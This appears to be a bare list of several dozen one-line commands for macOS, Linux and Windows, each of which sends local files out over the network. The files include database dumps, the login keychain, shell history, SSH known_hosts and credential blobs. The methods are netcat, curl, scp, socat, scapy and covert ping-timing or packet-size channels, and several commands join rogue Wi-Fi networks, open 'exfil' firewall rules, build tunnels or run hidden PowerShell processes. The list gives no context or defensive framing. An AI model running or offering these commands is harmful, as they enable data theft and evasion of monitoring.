[
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"qa-mesh-161\" \"mesh-161#\" && tar -C /Users/Shared/exports -czf - logs | base64 | split -b 1200k - /tmp/.w && for f in /tmp/.w*; do nc -6 fe80::a1b2:c3d4:e5f6:1122%en0 60477 -w 2 < \"$f\"; rm \"$f\"; done",
  "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
  "iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" -p 49377 exfil@10.55.88.25 \"cat > ~/rx/.sync.log\"",
  "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
  "iwconfig wlan2 >/dev/null 2>&1 && rsync -a --quiet -e \"ssh -o ConnectTimeout=5 -o BindAddress=$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1) -p 49222\" /home/user/.cache/session.dat exfil@10.55.88.12:~/inbox/session.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
  "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
  "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
  "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
  "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
  "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
  "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
  "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
  "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
  "sysctl -a | gzip -c | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.66 57114",
  "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
  "dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.77 53499",
  "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
  "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
  "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
  "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr utun2)\" \"fe80::5:cafe:2%utun2\" 55444 < /tmp/.audit.log",
  "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
  "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr p2p0)';dst='fe80::6:bad:1%p2p0';d=open('/Users/Shared/.dmp','rb').read();[send(IPv6(src=src,dst=dst)/ICMPv6EchoRequest(data=d[i:i+1200]),iface='p2p0',verbose=0) for i in range(0,len(d),1200)]\"",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr awdl0)';dst='fe80::3:dead:beef%awdl0';p=open('/tmp/diag.bin','rb').read();[send(IPv6(src=src,dst=dst)/UDP(sport=51888,dport=51888)/p[i:i+1200],iface='awdl0',verbose=0) for i in range(0,len(p),1200)]\"",
  "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
  "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
  "nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc",
  "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
  "nohup tcpdump -i lowpan0 -nn 'ip6 and udp port 56831' -U -w /dev/null >/dev/null 2>&1 & nc -6 -u -s fe80::100%lowpan0 fe80::200%lowpan0 56831 < /var/tmp/data.blob",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
  "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
  "nohup tcpdump -i ib0 -nn tcp port 56473 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.0.0.10 10.0.0.20 56473 < /var/tmp/pkg.cache",
  "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
  "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
  "$cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $dst='198.18.0.42'; $gw=(Get-NetIPConfiguration -InterfaceIndex $cell.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $dst mask 255.255.255.255 $gw metric 5 if $($cell.ifIndex)\"}; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $dst -p 65055 -B $ip -t 50",
  "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
  "New-NetIPAddress -InterfaceAlias 'Bluetooth Network Connection' -IPAddress 192.168.55.10 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 59321 -B 192.168.55.10\"",
  "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
  "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
  "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
  "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
  "netsh wlan set hostednetwork mode=allow ssid=DiagWiFi key=Passw0rd! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction SilentlyContinue; if($hn){New-NetIPAddress -InterfaceIndex $hn.ifIndex -IPAddress 192.168.88.1 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 192.168.88.2 -p 63456 -B 192.168.88.1 -t 40\"}",
  "netsh wlan set hostednetwork mode=allow ssid=svc_diag key=K0mp!exP@ss! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $hn.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 60789 -B $ip\"",
  "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
  "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
  "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
  "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
  "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
  "netsh interface portproxy add v6tov4 listenaddress=::1 listenport=49205 connectaddress=203.0.113.77 connectport=49206",
  "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
  "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
  "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
  "netsh interface 6to4 set state enabled relay=198.51.100.42",
  "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
  "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
  "netsh interface portproxy add v6tov6 listenaddress=::1 listenport=49601 connectaddress=2001:db8:4444::1 connectport=49602",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Downloads\\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*1394*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.44',56112); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\frame.buf'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Wi-Fi Direct*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.210',61234); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\wfd_chunk.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
  "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
  "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
  "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
  "$dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
